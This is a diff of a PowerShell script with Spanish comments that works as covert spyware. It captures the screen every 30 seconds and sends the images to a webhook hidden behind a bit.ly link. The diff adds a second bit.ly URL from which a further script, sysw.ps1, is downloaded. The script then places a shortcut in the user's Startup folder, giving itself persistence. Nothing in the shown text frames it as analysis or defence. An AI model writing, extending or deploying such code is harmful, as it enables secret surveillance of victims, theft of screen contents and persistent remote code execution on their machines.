@@ -1,13 +1,10 @@
 $hookurl = "https://bit.ly/chu_kbras"
 $seconds = 30 # Intervalo entre capturas
 $a = 0 # Contador de imágenes enviadas al webhook
-$maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
-
-# Obtener la ruta del script principal
-$scriptPath = $PSScriptRoot
+$maxImages = 10 # Cantidad máxima de imágenes antes de descargar el otro script
 
 # Detección de URL acortada
-if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected..0." ; $hookurl = (irm $hookurl).url}
+if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected..." ; $hookurl = (irm $hookurl).url}
 
 do {
     $Filett = "$env:temp\SC.png"
@@ -34,8 +31,9 @@ do {
     # Verificar si se ha alcanzado la cantidad máxima de imágenes
     if ($a -eq $maxImages) {
         # Descargar el script principal
+        $syswUrl = "https://bit.ly/Screen_dc"
         $syswPath = "$env:USERPROFILE\sysw.ps1"
-        Invoke-WebRequest -Uri $scriptPath -OutFile $syswPath
+        Invoke-WebRequest -Uri $syswUrl -OutFile $syswPath
         
         # Crear acceso directo en la carpeta de inicio del usuario
         $shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
